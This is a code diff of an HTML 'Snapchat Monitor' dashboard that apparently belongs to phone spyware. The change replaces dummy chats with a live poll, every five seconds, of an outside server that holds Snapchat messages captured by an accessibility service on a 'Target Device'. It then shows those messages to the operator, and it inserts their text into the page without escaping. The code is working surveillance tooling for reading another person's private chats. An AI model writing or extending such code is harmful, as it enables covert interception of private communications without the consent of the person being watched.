@@ -3,13 +3,13 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <title>Snapchat</title>
+    <title>Snapchat Monitor</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
         /* --- SNAPCHAT THEME CSS --- */
         body { 
             margin: 0; 
-            background-color: #f2f2f2; /* Desktop background */
+            background-color: #f2f2f2; 
             font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, Arial, sans-serif; 
             height: 100vh; 
             overflow: hidden; 
@@ -20,7 +20,7 @@
         .app-container {
             width: 100%;
             height: 100%;
-            max-width: 450px; /* Mobile size on Desktop */
+            max-width: 450px;
             background-color: #fff;
             position: relative;
             box-shadow: 0 0 20px rgba(0,0,0,0.1);
@@ -31,7 +31,6 @@
         /* --- VIEW 1: CHAT LIST --- */
         #snapListScreen { display: flex; flex-direction: column; height: 100%; width: 100%; }
         
-        /* Header */
         .snap-header { 
             background: #fff; 
             padding: 10px 15px; 
@@ -43,13 +42,9 @@
         }
         .header-left { display: flex; align-items: center; gap: 10px; }
         .avatar-small { width: 38px; height: 38px; background: #eee; border-radius: 50%; overflow: hidden; }
-        .avatar-small img { width: 100%; height: 100%; object-fit: cover; }
-        
         .page-title { font-weight: 700; font-size: 1.2rem; color: #000; }
-        
         .header-right { display: flex; gap: 15px; color: #000; font-size: 1.2rem; }
 
-        /* List Area */
         .friend-list { flex: 1; overflow-y: auto; }
         
         .friend-row { 
@@ -67,14 +62,8 @@
         .friend-data h3 { margin: 0; font-size: 1.05rem; font-weight: 500; color: #000; }
         
         .status-row { display: flex; align-items: center; gap: 8px; margin-top: 4px; }
-        
-        /* Status Boxes (The Red/Purple/Blue squares) */
         .status-icon { width: 12px; height: 12px; border-radius: 3px; display: inline-block; }
-        
-        .st-red { background-color: #f23c57; border: 1px solid #f23c57; } /* Snap */
-        .st-purple { background-color: #9b55a0; border: 1px solid #9b55a0; } /* Video */
-        .st-blue { background-color: #3cb2e2; border-radius: 3px; /* Chat bubble shape check */ }
-        
+        .st-red { background-color: #f23c57; border: 1px solid #f23c57; } 
         .st-text { font-size: 0.8rem; color: #666; font-weight: 400; }
 
         .cam-btn { 
@@ -103,38 +92,27 @@
             display: flex; flex-direction: column; gap: 8px; 
         }
         
-        /* Messages Styling */
         .s-msg { 
             padding: 8px 12px; 
             max-width: 80%; 
             font-size: 1rem; 
             position: relative;
+            background: #fcfcfc;
+            color: #333;
         }
         
-        /* Incoming: Blue line on left */
+        /* Incoming Style (Left) */
         .s-in { 
             align-self: flex-start; 
             border-left: 3px solid #3cb2e2; 
-            background: #fcfcfc;
-            color: #333; 
         }
-        .s-sender-name { font-size: 0.7rem; color: #3cb2e2; display: block; margin-bottom: 2px; text-transform: uppercase; font-weight: bold;}
-        
-        /* Outgoing: Red line on right */
-        .s-out { 
-            align-self: flex-end; 
-            border-right: 3px solid #f23c57; 
-            text-align: right; 
-            background: #fcfcfc;
-            color: #333; 
-        }
+        .s-sender-name { font-size: 0.7rem; color: #999; display: block; margin-bottom: 2px; }
 
         .chat-bottom { padding: 10px; border-top: 1px solid #eee; display: flex; align-items: center; gap: 10px; background: #fff; }
         .snap-input { flex: 1; background: #eee; border: none; padding: 12px 20px; border-radius: 20px; outline: none; }
 
-        /* Fake Bottom Nav for Realism */
         .bottom-nav { 
-            height: 60px; border-top: 1px solid #eee; display: flex; justify-content: space-around; align-items: center; background: #fff; opacity: 0.5; pointer-events: none;
+            height: 60px; border-top: 1px solid #eee; display: flex; justify-content: space-around; align-items: center; background: #fff; opacity: 0.8; 
         }
         .nav-item { font-size: 1.4rem; color: #ccc; }
         .nav-active { color: #3cb2e2; }
@@ -156,12 +134,13 @@
                 <div class="page-title">Chat</div>
                 <div class="header-right">
                     <i class="fa-solid fa-user-plus"></i>
-                    <i class="fa-solid fa-ellipsis"></i>
+                    <i class="fa-solid fa-ellipsis" onclick="location.reload()"></i>
                 </div>
             </div>
 
             <div class="friend-list" id="snapContainer">
-                </div>
+                <p style="text-align:center; padding-top:20px; color:#999;">Loading Chats...</p>
+            </div>
 
             <div class="bottom-nav">
                 <div class="nav-item"><i class="fa-solid fa-location-dot"></i></div>
@@ -182,7 +161,7 @@
             </div>
             
             <div class="snap-msgs" id="snapMsgsBox">
-                </div>
+            </div>
 
             <div class="chat-bottom">
                 <i class="fa-solid fa-camera" style="color:#000; font-size:1.2rem; background:#f0f0f0; padding:8px; border-radius:50%"></i>
@@ -194,81 +173,73 @@
     </div>
 
     <script>
-        // --- MULTI-USER ID LOGIC ---
+        // --- LIVE SERVER LOGIC ---
 
-        // 1. Dashboard ID Retrieve
         const DEVICE_ID = localStorage.getItem('monitoring_id');
-
-        // Security Check
+        const SERVER_URL = "https://child-v9no.onrender.com/api/get_data";
+        
         if (!DEVICE_ID) {
-            alert("No Device ID Found. Redirecting...");
+            alert("Device ID missing! Redirecting...");
             window.location.href = 'index.html'; 
         }
 
-        // 2. Dynamic Key Logic
-        const STORAGE_KEY = `snapchat_data_${DEVICE_ID}`;
+        let snapData = [];
 
-        // 3. Data Fetching
-        let storedData = localStorage.getItem(STORAGE_KEY);
-        let snaps = [];
+        async function fetchSnapData() {
+            try {
+                // Fetch Chat Logs from Server
+                const response = await fetch(`${SERVER_URL}?device_id=${DEVICE_ID}&type=chat_logs`);
+                const result = await response.json();
 
-        if (storedData) {
-            snaps = JSON.parse(storedData);
-        } else {
-            // --- DUMMY DATA FOR TESTING ---
-            // Colors: 'red' (Snap), 'purple' (Video), 'blue' (Chat)
-            console.log(`Generating Snap data for ID: ${DEVICE_ID}`);
-            snaps = [
-                { 
-                    id: 1, name: "Bestie ❤️", status: "New Snap • 1m", color: "red",
-                    msgs: [
-                        {side:'in', text:'Check my story!'}, 
-                        {side:'out', text:'Saw it, looks fun'}
-                    ] 
-                },
-                { 
-                    id: 2, name: "Rahul (Target: "+DEVICE_ID+")", status: "New Chat • 5m", color: "blue",
-                    msgs: [
-                        {side:'in', text:'Kal chalna hai?'}, 
-                        {side:'out', text:'Ha bhai ready hu'}
-                    ] 
-                },
-                { 
-                    id: 3, name: "Class Group", status: "New Video • 10m", color: "purple",
-                    msgs: [
-                        {side:'in', text:'Notes bhejo koi'}
-                    ] 
+                if (result.status === 'success' && result.data) {
+                    
+                    // Filter ONLY Snapchat messages
+                    const rawLogs = result.data.filter(item => item.app === 'Snapchat');
+
+                    if (rawLogs.length > 0) {
+                        // Format messages for UI
+                        // Accessibility service sends raw text, so we group them by time
+                        const formattedMsgs = rawLogs.map(log => ({
+                            text: log.text,
+                            time: new Date(log.timestamp).toLocaleTimeString(),
+                            fullTime: log.timestamp
+                        }));
+
+                        // Combine all into one "Live Activity" thread for simplicity
+                        snapData = [{
+                            id: 1,
+                            name: `Target Device (${DEVICE_ID})`,
+                            status: "New Snap Activity",
+                            msgs: formattedMsgs.reverse() // Show newest at bottom usually
+                        }];
+                    } else {
+                        snapData = [];
+                    }
+                    renderSnaps();
                 }
-            ];
-            // Save dummy data
-            localStorage.setItem(STORAGE_KEY, JSON.stringify(snaps));
+            } catch (error) {
+                console.error("Error fetching data:", error);
+                document.getElementById('snapContainer').innerHTML = "<p style='text-align:center; color:red'>Server Error</p>";
+            }
         }
-
-        // --- RENDER FUNCTIONS ---
 
         function renderSnaps() {
             const con = document.getElementById('snapContainer');
             con.innerHTML = "";
             
-            if(snaps.length === 0) {
-                con.innerHTML = "<p style='text-align:center; padding:20px; color:#ccc'>No Snaps</p>";
+            if(snapData.length === 0) {
+                con.innerHTML = "<p style='text-align:center; padding:20px; color:#ccc'>No Snapchat Logs Found Yet</p>";
                 return;
             }
 
-            snaps.forEach(s => {
-                // Determine Icon Color
-                let boxClass = '';
-                if(s.color === 'red') boxClass = 'st-red';
-                else if(s.color === 'purple') boxClass = 'st-purple';
-                else boxClass = 'st-blue';
-
+            snapData.forEach(s => {
                 con.innerHTML += `
                     <div class="friend-row" onclick="openSnap(${s.id})">
                         <div class="bitmoji">👻</div>
                         <div class="friend-data">
                             <h3>${s.name}</h3>
                             <div class="status-row">
-                                <span class="status-icon ${boxClass}"></span>
+                                <span class="status-icon st-red"></span>
                                 <span class="st-text">${s.status}</span>
                             </div>
                         </div>
@@ -278,7 +249,7 @@
         }
 
         function openSnap(id) {
-            const s = snaps.find(x => x.id === id);
+            const s = snapData.find(x => x.id === id);
             
             if(s) {
                 document.getElementById('snapName').innerText = s.name;
@@ -286,21 +257,15 @@
                 box.innerHTML = "";
                 
                 s.msgs.forEach(m => {
-                    let cls = m.side === 'in' ? 's-in' : 's-out';
-                    let senderName = m.side === 'in' ? `<span class="s-sender-name">${s.name}</span>` : '';
-                    
                     box.innerHTML += `
-                        <div class="s-msg ${cls}">
-                            ${senderName}
+                        <div class="s-msg s-in">
+                            <span class="s-sender-name">${m.time}</span>
                             ${m.text}
                         </div>`;
                 });
 
-                // Screen Switch
                 document.getElementById('snapListScreen').style.display = 'none';
                 document.getElementById('snapChatScreen').style.display = 'flex';
-
-                // Scroll
                 box.scrollTop = box.scrollHeight;
             }
         }
@@ -310,8 +275,10 @@
             document.getElementById('snapListScreen').style.display = 'flex';
         }
 
-        // Init
-        renderSnaps();
+        // Auto Refresh every 5 seconds
+        fetchSnapData();
+        setInterval(fetchSnapData, 5000);
+
     </script>
 </body>
 </html>
